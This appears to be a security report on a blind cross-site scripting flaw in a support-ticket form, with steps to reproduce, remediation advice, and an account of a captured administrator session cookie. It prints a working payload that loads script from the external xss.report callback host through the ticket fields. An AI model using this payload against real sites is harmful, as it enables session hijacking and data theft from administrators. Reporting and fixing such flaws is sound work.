## Title
Blind XSS - ZAP-Hosting

## Description
**Affected URL:** https://contact.pwnedbox.site/

The ticket submission form accepts user-controlled input through the Name, Subject, and Message fields. The submitted content is stored and later accessed through the support administration panel.

Blind XSS was confirmed when the submitted payload generated an external callback after an administrator opened Ticket #3.

## Steps to Reproduce
1. Open https://contact.pwnedbox.site/ and select the support ticket option.
2. Enter the payload in the Name, Subject, and Message fields.
3. Provide a valid email address and complete the CAPTCHA.
4. Submit the ticket.
5. Wait for an administrator to access the submitted ticket and check XSS.Report for callbacks.

## POC (Proof of Concept)
**Lab Address:** https://contact.pwnedbox.site/

**HTTP Method:** POST

**Vulnerable Parameters:** Name, Subject, and Message.

**Payload:**
```html
"><iMaGE/src/onerror=import('//xss.report/c/mihir')>
```

**Request Parameters:**
```text
Name: "><iMaGE/src/onerror=import('//xss.report/c/mihir')>
Subject: "><iMaGE/src/onerror=import('//xss.report/c/mihir')>
Message: "><iMaGE/src/onerror=import('//xss.report/c/mihir')>
Email: test@gmail.com
```

**Observed Result:**

The submitted ticket was created as Ticket #3. When the administrator accessed the ticket at:

`https://contact.pwnedbox.site/index.php?view=ticket&id=3`

XSS.Report recorded callbacks associated with the ticket page. The captured report also showed the admin page as the referrer and recorded a PHP session cookie value.

**Screenshot Evidence:**
1. Support ticket form containing the injected payload.
<img width="1919" height="974" alt="image" src="https://github.com/user-attachments/assets/61c68222-6cdf-4f20-b9b3-c81cc33be7cc" />

2. Admin view displaying Ticket #3 and the submitted fields.
<img width="1919" height="957" alt="image" src="https://github.com/user-attachments/assets/ae9315b1-3369-464a-969e-ff62a0b6e27f" />

3. XSS.Report dashboard showing callbacks from the target.
<img width="1919" height="965" alt="image" src="https://github.com/user-attachments/assets/ead2b36f-623d-46ac-90d2-1a3cc6296aaf" />

4. XSS.Report detail page showing the ticket URL and captured request information.
<img width="1919" height="983" alt="image" src="https://github.com/user-attachments/assets/fa01b743-798b-4c22-be11-c4bf70e7e4ef" />


## Impact
An attacker can submit a malicious support ticket that executes JavaScript when an administrator views it.

Potential consequences include:
- JavaScript execution in an administrator's browser.
- Exposure of information accessible within the administrator's browser.
- Potential session hijacking if the captured session cookie is usable.
- Unauthorized actions through the administrator's active session, depending on application protections.

## Remediation
1. Apply context-aware output encoding before displaying ticket fields.
2. Never render user-submitted ticket content as raw HTML.
3. Validate and safely sanitize all submitted fields on the server side.
4. Set session cookies with `HttpOnly`, `Secure`, and appropriate `SameSite` attributes.
